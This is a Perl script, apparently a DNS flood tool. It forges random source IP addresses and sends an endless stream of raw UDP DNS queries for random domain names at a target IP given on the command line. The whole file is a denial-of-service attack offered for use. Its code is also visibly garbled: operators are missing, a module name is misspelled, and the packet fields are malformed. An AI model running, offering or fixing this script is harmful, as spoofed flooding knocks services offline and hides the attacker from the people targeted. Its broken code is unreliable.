use Net::DNS::Resolver;
use Net::DNS::Packet;
use strict;

if($ARGV[0] eq '') {
    print "Usage: dnsflood.pl <ip adress>\n";
    exit(0);
}

print("attacked: $ARGV[0]...\n");

my @abc = ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m","n", "o","p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
my @domains = ("com", "org", "net"); 
my $str = @abc[int rand (25)];
my $name;
my $src_ip;

for(my $i = 0; $i < 256; $i++) {
    if($i>60) {
    $str = @abc[int rand(9)];
    $i = 0;
}

$str .= @abc[int rand(25)];
$name = $str . "." . @domains[int rand(3)];
$src_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." int(rand(255));


my $dnspacket = new Net::DNS::Packet($name, 'A');
my $dnsdata = $dnspacket->data;
my $sock = new Net:RawIP({udp=>{}});

$sock-> set({ip => {
        saddr => $src_ip => "$ARGV[0]", frag_off => 0 , tos => 0, ttl => 128, id => 1565},
    dest => {source => 53,
    dest => 53, data=> $dnsdata
} });

$sock-> send;

}
exit(0);